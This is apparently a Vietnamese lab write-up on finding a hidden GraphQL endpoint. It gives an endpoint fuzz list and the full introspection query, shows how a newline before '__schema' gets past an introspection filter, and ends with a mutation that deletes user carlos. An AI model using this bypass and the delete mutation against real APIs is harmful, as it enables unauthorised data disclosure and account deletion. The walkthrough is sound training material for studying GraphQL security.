## Finding a hidden GraphQL endpoint

1. Ở bài này, API endpoint bị ẩn đi. Thử fuzz bằng danh sách các endpoint graphql thông dụng
```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```
Có thể thêm ``/v1`` va
2. Nhận thấy với method GET và endpoint ``/api`` trả về 400 với msg là Query not present -> GraphQL endpoint
3. Get introspection query (standar)
```
query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```
4. Response trả về cho biết là introspection not allowed
![image](https://github.com/user-attachments/assets/55c2ca26-adef-4f8b-9e92-3ab7f470eb13)

5. Bypass filter bằng cách thêm newline vào trước ``__schema`` (có thể dev đã filter từ ``__schema{``) thì thành công
![image](https://github.com/user-attachments/assets/8ea2f0b2-1265-45e4-96e5-c8fd8582e3bb)

6. Save phần introspection mới lấy được ở trên rồi insert vào InQL
![image](https://github.com/user-attachments/assets/ef1501b4-3215-4479-9e94-09ff50317149)

7. Dùng query để tìm id của carlos:
![image](https://github.com/user-attachments/assets/107a4fc7-fe26-4fe9-889d-5332e589c8a0)

8. Tạo payload mutation để xóa user carlos (id:3)
![image](https://github.com/user-attachments/assets/cda6e55a-13f0-4b9e-bc5a-cf6430d13fb2)

```
mutation{
	deleteOrganizationUser(input:{id:3}){
		user{
			id
		}
	}
}
```
